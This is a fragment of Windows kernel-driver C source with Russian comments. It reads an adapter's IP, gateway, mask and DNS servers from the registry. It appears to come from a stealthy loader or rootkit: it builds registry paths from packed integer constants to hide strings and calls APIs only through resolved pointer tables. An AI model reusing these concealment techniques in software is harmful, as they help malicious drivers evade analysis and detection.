    //RtlStringCchCopyW(regNode, ssLen, ifNodeName);
    //const wchar_t ifNodeName[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\";
    ptr1 = (uint8_t*)regNode;
    *(((uint32_t*)ptr1)++) = 0x0052005C;    // \0\\0R
    *(((uint32_t*)ptr1)++) = 0x00670065;    // \0e\0g
    *(((uint32_t*)ptr1)++) = 0x00730069;    // \0i\0s
    *(((uint32_t*)ptr1)++) = 0x00720074;    /* \0t\0r */
    *(((uint32_t*)ptr1)++) = 0x005C0079;    /* \0y\0\ */
    *(((uint32_t*)ptr1)++) = 0x0061004D;    // \0M\0a
    *(((uint32_t*)ptr1)++) = 0x00680063;    // \0c\0h
    *(((uint32_t*)ptr1)++) = 0x006E0069;    // \0i\0n
    *(((uint32_t*)ptr1)++) = 0x005C0065;    /* \0e\0\ */
    *(((uint32_t*)ptr1)++) = 0x00790053;    /* \0S\0y */
    *(((uint32_t*)ptr1)++) = 0x00740073;    // \0s\0t
    *(((uint32_t*)ptr1)++) = 0x006D0065;    // \0e\0m
    *(((uint32_t*)ptr1)++) = 0x0043005C;    // \0\\0C
    *(((uint32_t*)ptr1)++) = 0x00720075;    // \0u\0r
    *(((uint32_t*)ptr1)++) = 0x00650072;    // \0r\0e
    *(((uint32_t*)ptr1)++) = 0x0074006E;    // \0n\0t
    *(((uint32_t*)ptr1)++) = 0x006F0043;    // \0C\0o
    *(((uint32_t*)ptr1)++) = 0x0074006E;    // \0n\0t
    *(((uint32_t*)ptr1)++) = 0x006F0072;    // \0r\0o
    *(((uint32_t*)ptr1)++) = 0x0053006C;    // \0l\0S
    *(((uint32_t*)ptr1)++) = 0x00740065;    // \0e\0t
    *(((uint32_t*)ptr1)++) = 0x0053005C;    // \0\\0S
    *(((uint32_t*)ptr1)++) = 0x00720065;    // \0e\0r
    *(((uint32_t*)ptr1)++) = 0x00690076;    // \0v\0i
    *(((uint32_t*)ptr1)++) = 0x00650063;    // \0c\0e
    *(((uint32_t*)ptr1)++) = 0x005C0073;    /* \0s\0\ */
    *(((uint32_t*)ptr1)++) = 0x00630054;    // \0T\0c
    *(((uint32_t*)ptr1)++) = 0x00690070;    // \0p\0i
    *(((uint32_t*)ptr1)++) = 0x005C0070;    /* \0p\0\ */
    *(((uint32_t*)ptr1)++) = 0x00610050;    // \0P\0a
    *(((uint32_t*)ptr1)++) = 0x00610072;    // \0r\0a
    *(((uint32_t*)ptr1)++) = 0x0065006D;    // \0m\0e
    *(((uint32_t*)ptr1)++) = 0x00650074;    // \0t\0e
    *(((uint32_t*)ptr1)++) = 0x00730072;    // \0r\0s
    *(((uint32_t*)ptr1)++) = 0x0049005C;    // \0\\0I
    *(((uint32_t*)ptr1)++) = 0x0074006E;    // \0n\0t
    *(((uint32_t*)ptr1)++) = 0x00720065;    // \0e\0r
    *(((uint32_t*)ptr1)++) = 0x00610066;    // \0f\0a
    *(((uint32_t*)ptr1)++) = 0x00650063;    // \0c\0e
    *(((uint32_t*)ptr1)++) = 0x005C0073;    /* \0s\0\ */
    *((uint32_t*)ptr1) = 0x0000;            // \0\0

    pGlobalBlock->pCommonBlock->fncommon_wcscat_s(regNode, ssLen, devPtr);
    pGlobalBlock->pCommonBlock->fnRtlInitUnicodeString(&interfacesKey, regNode);

    // Узнаём конфигурацию сети
    ntStatus = pGlobalBlock->pCommonBlock->fnRegistryOpenKey(&regHandle, &interfacesKey);
    if (ntStatus == STATUS_SUCCESS) {
        int i;
        for (i = 0; i < NUMBER_OF_PARAMS; ++i) {
            tmpRegValue[0] = 0;
            pGlobalBlock->pCommonBlock->fnRegistryReadValue(regHandle, pGlobalBlock->pNetworkBlock->netParams[i], (wchar_t*)tmpRegValue);

            // Если у нас не получилось считать значение или оно отсутствует, скорее всего у
            // нас случай с DHCP. Пытаемся считать альтернативный параметр.
            if (tmpRegValue[0] == 0 || (tmpRegValue[0] == L'0' && tmpRegValue[1] == L'.')) {
                tmpRegValue[0] = 0;
                pGlobalBlock->pCommonBlock->fnRegistryReadValue(regHandle, pGlobalBlock->pNetworkBlock->altNetParams[i], (wchar_t*)tmpRegValue);

                if (tmpRegValue[0] == 0 || (tmpRegValue[0] == L'0' && tmpRegValue[1] == L'.')) {
                    goto Complete1;
                }
            }

            if (pGlobalBlock->pNetworkBlock->fnconvertStringIpToUINT32(tmpRegValue, &netAdaptParams[i]) != STATUS_SUCCESS) {
                goto Complete1;
            }
#if DBG
            {
                uint32_t tmpIpVal = netAdaptParams[i];
                FnKdPrint(("   %s -> %d.%d.%d.%d\n", TmpIptable[i], tmpIpVal & 0xff, (tmpIpVal >> 8) & 0xff, (tmpIpVal >> 16) & 0xff, (tmpIpVal >> 24) & 0xff));
            }
#endif
        }

        // Отдельный случай представляет параметр NameServer. Он может содержать несколько
        // IP адресов, перечисленных через запятую.
        tmpRegValue[0] = 0;
        pGlobalBlock->pCommonBlock->fnRegistryReadValue(regHandle, pGlobalBlock->pNetworkBlock->netParams[3], (wchar_t*)tmpRegValue);

        // Если у нас не получилось считать значение или оно отсутствует, скорее всего у
        // нас случай с DHCP. Пытаемся считать альтернативный параметр.
        if (tmpRegValue[0] == 0 || (tmpRegValue[0] == L'0' && tmpRegValue[1] == L'.')) {
            tmpRegValue[0] = 0;
            pGlobalBlock->pCommonBlock->fnRegistryReadValue(regHandle, pGlobalBlock->pNetworkBlock->altNetParams[3], (wchar_t*)tmpRegValue);

            if (tmpRegValue[0] == 0 || (tmpRegValue[0] == L'0' && tmpRegValue[1] == L'.')) {
                goto Complete1;
            }
        }

        FnKdPrint(("   name servers -> "));
        for ( ; *ptr != 0 && counter < 2; ++ptr, ++counter) {
            zeroPtr = ptr;
            while (*zeroPtr != L',' && *zeroPtr != L' ' && *zeroPtr != 0) ++zeroPtr;
            *zeroPtr = 0;
            pGlobalBlock->pCommonBlock->fnRtlInitUnicodeString(&uStr, ptr);

            if (pGlobalBlock->pNetworkBlock->fnconvertStringIpToUINT32(ptr, &netNameServers[counter]) != STATUS_SUCCESS) {
                goto Complete1;
            }
#if DBG
            {
                uint32_t tmpIpVal = netNameServers[counter];
                FnKdPrint(("%d.%d.%d.%d, ", tmpIpVal & 0xff, (tmpIpVal >> 8) & 0xff, (tmpIpVal >> 16) & 0xff, (tmpIpVal >> 24) & 0xff));
            }
#endif
            ptr = zeroPtr;
        }
#if DBG
        FnKdPrint(("\n"));
#endif
        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, ppAdapter, sizeof(ndis_adapter_t) + pMiniportName->MaximumLength, NonPagedPool);

        if (*ppAdapter != NULL) {
            pndis_adapter_t pAdapter = *ppAdapter;
            pAdapter->miniportName.MaximumLength = pMiniportName->MaximumLength;
            pAdapter->miniportName.Length = pMiniportName->Length;
            pAdapter->miniportName.Buffer = (PWCHAR)((uint8_t*)pAdapter + sizeof(ndis_adapter_t));
            __movsb((uint8_t*)pAdapter->miniportName.Buffer, (const uint8_t*)pMiniportName->Buffer, pMiniportName->MaximumLength);

            pAdapter->ipAddr = netAdaptParams[0];
            pAdapter->ipGateway = netAdaptParams[1];
            pAdapter->ipMask = netAdaptParams[2];
            pAdapter->ipNameServers[0] = netNameServers[0];
            pAdapter->ipNameServers[1] = netNameServers[1];
            pAdapter->bObtainedIPs = TRUE;
        }

Complete1:
        pGlobalBlock->pCommonBlock->fnZwClose(regHandle);
    }
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(regNode, LOADER_TAG);
}